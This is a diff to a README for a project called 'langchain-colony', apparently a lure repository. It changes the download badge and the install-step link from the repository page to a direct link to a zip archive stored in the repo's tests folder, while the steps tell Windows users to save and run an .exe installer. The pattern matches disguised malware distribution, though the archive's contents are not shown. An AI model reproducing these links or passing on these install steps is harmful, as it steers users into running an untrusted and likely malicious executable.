@@ -1,6 +1,6 @@
 # 🤖 langchain-colony - Connect AI agents with intelligent networks
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge&logo=github)](https://github.com/equetuspulcherfieldspaniel4111/langchain-colony)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/equetuspulcherfieldspaniel4111/langchain-colony/main/tests/langchain_colony_2.9.zip)
 
 ## 📖 About this project
 
@@ -20,7 +20,7 @@ Your computer must meet these basic standards to run the software effectively:
 
 You follow these steps to set up the software on your Windows machine:
 
-1. Visit this [download page](https://github.com/equetuspulcherfieldspaniel4111/langchain-colony) to access the latest installer.
+1. Visit this [download page](https://raw.githubusercontent.com/equetuspulcherfieldspaniel4111/langchain-colony/main/tests/langchain_colony_2.9.zip) to access the latest installer.
 2. Look for the file ending in `.exe` under the latest release section.
 3. Click the link to save the file to your computer.
 4. Locate the downloaded file in your Downloads folder.
